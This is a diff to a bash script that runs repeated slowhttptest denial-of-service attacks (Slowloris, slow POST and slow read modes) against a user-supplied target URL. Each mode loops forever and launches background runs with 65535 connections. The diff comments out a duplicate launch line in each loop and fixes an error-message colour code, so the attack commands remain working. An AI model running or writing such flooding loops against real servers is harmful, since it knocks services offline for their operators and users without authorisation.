@@ -41,7 +41,7 @@ Slowloris() {
     while true
     do
         slowhttptest -c 65535 -H -i 10 -r 200 -t GET -u "$TARGET" &
-        slowhttptest -c 65535 -H -i 10 -r 200 -t GET -u "$TARGET" &
+        #slowhttptest -c 65535 -H -i 10 -r 200 -t GET -u "$TARGET" &
         sleep 2m
     done
 }
@@ -49,7 +49,7 @@ HttpPost() {
     while true
     do
         slowhttptest -c 65535 -B -i 10 -r 200 -s 8192 -t FAKEVERB -u "$TARGET" &
-        slowhttptest -c 65535 -B -i 10 -r 200 -s 8192 -t FAKEVERB -u "$TARGET" &
+        #slowhttptest -c 65535 -B -i 10 -r 200 -s 8192 -t FAKEVERB -u "$TARGET" &
         sleep 2m
     done
 }
@@ -57,7 +57,7 @@ SlowRead() {
     while true
     do
         slowhttptest -c 65535 -X -i 10 -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u "$TARGET" &
-        slowhttptest -c 65535 -X -i 10 -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u "$TARGET" &
+        #slowhttptest -c 65535 -X -i 10 -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u "$TARGET" &
         sleep 2m
     done
 }
@@ -73,5 +73,5 @@ case "$num" in
         SlowRead
         ;;
     *)
-        echo -e "${READ} You not choosen one number !{RES}"
+        echo -e "${READ} You not choosen one number ${RES}"
 esac
